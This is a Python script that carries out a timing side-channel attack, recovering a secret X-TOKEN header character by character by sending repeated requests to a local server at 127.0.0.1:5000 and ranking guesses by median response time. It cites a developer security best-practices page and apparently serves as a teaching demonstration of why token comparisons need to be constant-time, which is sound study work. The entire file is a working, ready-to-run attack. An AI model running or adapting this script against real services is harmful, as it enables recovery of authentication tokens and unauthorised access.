
'''
Timing attack module
Reference: https://sqreen.github.io/DevelopersSecurityBestPractices/timing-attack/python
'''
import sys
import time
import string
import statistics

import requests

from operator import itemgetter

#Local URL in port 5000
URL =  "http://127.0.0.1:5000/"
#Times to request one letter with this we can get statistics
N = 100
#In this case we assume that we know the length of the token
TOKEN_SIZE = 3

#Exception for interrupt if the password has been found
class PasswordFound(Exception):

    def __init__(self, password):
        self.password = password

#A loop for request multiple time to the server and get times which help to get statistics
def try_to_hack(characters):
    timings = []

    print('-', end='', flush=True)

    for i in range(N):
        before = time.perf_counter()
        result = requests.get(URL, headers={'X-TOKEN':characters})
        after = time.perf_counter()

        if result.status_code == 200:
            raise PasswordFound(characters)
        elif result.status_code != 403:
            raise Exception(result, result.status_code)
        
        #appending the delta times for statistics
        timings.append(after-before)

    return timings

#Loop for try different characters
def find_next_characters(base):
    measures = []

    print("Trying to find the character at position %s with prefix %r " % ((len(base) +1 ), base))
    for i, character in enumerate(string.ascii_lowercase):

        #calling try_to_hack that takes the past characters + new character to try + padding with 0s
        timings = try_to_hack(base + character + "0" * (TOKEN_SIZE -len(base)-1))

        #some statistics
        median = statistics.median(timings)
        min_timing = min(timings)
        max_timing = max(timings)
        stddev = statistics.stdev(timings)

        measures.append({'character':character, 'median': median, 'min': min_timing, 'max': max_timing, 'stddev':stddev })

    sorted_measures = list(sorted(measures, key=itemgetter('median'), reverse=True))

    found_character = sorted_measures[0]
    top_characters = sorted_measures[1:4]

    print("Found character at position %s: %r" % ((len(base)+1), found_character['character']))
    msg = "Median %s Max: %s Min: %s stddev: %s"
    print(msg % (found_character['median'], found_character['max'], found_character['min'], found_character['stddev']))

    for top_character in top_characters:
        ratio = int((1 - (top_character['median'] / found_character['median'])) * 100 )
        msg = "Character: %r Median %s Max: %s Min: %s stddev: %s (%d%% slower)"
        print(msg % (top_character['character'],top_character['median'], top_character['max'], top_character['min'], top_character['stddev'], ratio))

    return found_character['character']

def main():
    requests.get(URL)

    base = ''

    try:
        while len(base) != TOKEN_SIZE:
            next_character = find_next_characters(base)
            base += next_character
            print("\n\n", end="")

    except PasswordFound as e:
        print("\n\n", end="")
        print("The token is: %r %s" % (e.password, '!'*10))
        sys.exit(0)

if __name__ == '__main__':
    main() 